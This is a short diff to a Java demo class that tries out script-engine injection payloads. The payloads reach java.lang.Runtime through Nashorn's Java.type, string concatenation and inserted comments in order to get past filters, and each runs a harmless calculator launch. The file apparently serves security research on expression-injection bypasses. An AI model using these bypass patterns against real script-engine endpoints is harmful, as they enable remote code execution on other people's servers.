@@ -1,7 +1,5 @@
 package org.command.code;
 
-import org.ppp.tools.encryption.B64;
-
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineFactory;
 import javax.script.ScriptEngineManager;
@@ -83,6 +81,7 @@ public class ScriptEngineDemo {
 
         // type()
         String type = "var JavaTest= Java.type(\"java.lang\"+\".Runtime\"); var b =JavaTest.getRuntime(); b.exec(\"open -a Calculator.app\");";
+        System.out.println(type);
 //        engine.eval(type);
 
         // Rhino
@@ -98,7 +97,6 @@ public class ScriptEngineDemo {
         // 注释符
         String comment1 = "java.lang./**/Runtime.getRuntime().exec(\"open -a Calculator.app\")";
         String comment2 = "java.lang.//\nRuntime.getRuntime().exec(\"open -a Calculator.app\")";
-        engine.eval(comment2);
 
 
     }
